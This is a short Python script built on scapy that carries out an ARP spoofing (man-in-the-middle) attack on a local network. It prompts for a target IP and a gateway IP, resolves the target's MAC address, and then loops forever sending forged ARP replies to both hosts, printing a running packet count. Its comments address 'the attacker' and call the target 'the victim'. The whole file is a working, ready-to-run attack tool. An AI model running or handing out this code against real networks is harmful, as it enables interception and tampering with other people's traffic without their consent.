#!/usr/bin/env python
import scapy.all as scapy #imports everything in the scapy module as the name "scapy"
import time #imports the time module

TARGET_CLIENT = input("Enter the target IP address: \n") #prompts the attacker to enter the IP address their target
ROUTER = input("Enter the router IP address: \n") #prompts the attacket to enter the IP address of the router/gateway

#This function akes in an IP address, sends out an ARP request and returns the client's MAC address
def parse_mac(ip): 
    arp_request = scapy.ARP(pdst=ip) #this creates an ARP request packet to the IP address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #This defines the ethernet frame for the broadcast
    broadcast_arp_req = broadcast / arp_request #this broadcasts the ARP request on the local network
    answered = scapy.srp(broadcast_arp_req, timeout=1, verbose=False)[0] #this captures the answered ARP responses
    return answered[0][1].hwsrc #this returns the MAC address for the client that answered the ARP request

#Sends an ARP response packet to a target using a spoof IP.
def spoof(target_ip, spoof_ip): #this function takes in the IP address of the target and the spoof address
    target_mac = parse_mac(target_ip) #this will capture the MAC address of the target by running the parse_mac function
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #creates the ARP response; op=2 for ARP response (op=1 for request)
    scapy.send(packet, verbose=False) #this sends the ARP response

#Loop for maintaining the ARP poisoning, with a counter for # of packets sent
packets_sent = 0 #initiate a counter variable with value = 0 to start
while True: #open loop (stays True unless attacker force quits the script)
    spoof(TARGET_CLIENT, ROUTER) #runs the spoof funciton on the router
    spoof(ROUTER, TARGET_CLIENT) #runs the spoof funciton on the victim client
    packets_sent += 2 #increases the packets sent counter by 2
    print(f"\r[+] Packets sent: {packets_sent}", end="") #dynamically prints the counter
    time.sleep(2) #defines a 2 second pause before iterating through the loop

